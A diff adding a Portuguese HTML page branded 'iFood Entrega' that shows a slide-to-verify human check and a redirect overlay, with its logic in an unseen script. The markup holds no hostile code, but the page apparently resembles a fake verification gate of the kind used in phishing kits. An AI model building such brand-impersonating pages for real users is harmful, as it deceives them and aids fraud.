@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Segurança - iFood Entrega</title>
+    <link rel="stylesheet" href="verificacao.css">
+    <link rel="icon" href="/assets/favicon.png">
+
+</head>
+
+<body>
+    <div class="verification-container">
+        <div class="header">
+            <div class="shield-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                    stroke-linejoin="round">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                </svg>
+            </div>
+            <h1>Verificacao de Seguranca</h1>
+            <p>Por favor, complete a verificacao abaixo</p>
+        </div>
+
+        <div class="slider-card">
+            <p class="instruction">Arraste para verificar que voce e humano</p>
+            <div class="slider-container" id="sliderContainer">
+                <div class="slider-track">
+                    <div class="slider-text">Arraste para a direita</div>
+                    <div class="slider-progress" id="sliderProgress"></div>
+                    <div class="slider-handle" id="sliderHandle">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <polyline points="9 18 15 12 9 6"></polyline>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>Protegido por verificacao anti-robo avancada</p>
+        </div>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <p>Verificando... Redirecionando...</p>
+    </div>
+
+    <script src="verificacao.js"></script>
+</body>
+
+</html>
